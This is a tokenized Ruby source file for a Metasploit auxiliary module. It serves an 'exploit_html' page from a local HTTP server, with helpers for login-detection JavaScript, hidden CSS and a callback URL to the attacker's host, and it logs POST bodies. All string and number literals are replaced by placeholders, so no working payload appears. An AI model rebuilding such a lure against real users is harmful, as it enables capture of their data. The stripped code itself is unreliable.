require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpServer :: HTML include Msf :: Auxiliary :: Report def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> ] ] , <str> = > [ <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptBool . new ( <str> , [ true , <str> , true ] ) , OptBool . new ( <str> , [ true , <str> , true ] ) ] , self . class ) end def on_request_uri ( cli , request ) print_status ( <str> request . method <str> request . uri <str> ) if request . method . downcase == <str> print_error request . body [ <int> .. <int> ] send_response_html ( cli , <str> ) else print_status ( <str> ) send_response_html ( cli , exploit_html ) end end def exploit_html <<- <str> EOS <str> <str> EOS end def detect_login_js if datastore [ <str> ] <str> backend_url <str> Rex :: Text . rand_text_alphanumeric ( rand ( <int> ) + <int> ) <str> else <str> end end def hidden_css if datastore [ <str> ] <str> else <str> end end def backend_url proto = ( datastore [ <str> ] ? <str> : <str> ) myhost = ( datastore [ <str> ] == <str> ) ? Rex :: Socket . source_address : datastore [ <str> ] port_str = ( datastore [ <str> ] . to_i == <int> ) ? <str> : <str> datastore [ <str> ] <str> <str> proto <str> myhost <str> port_str <str> datastore [ <str> ] <str> end def run exploit end end 
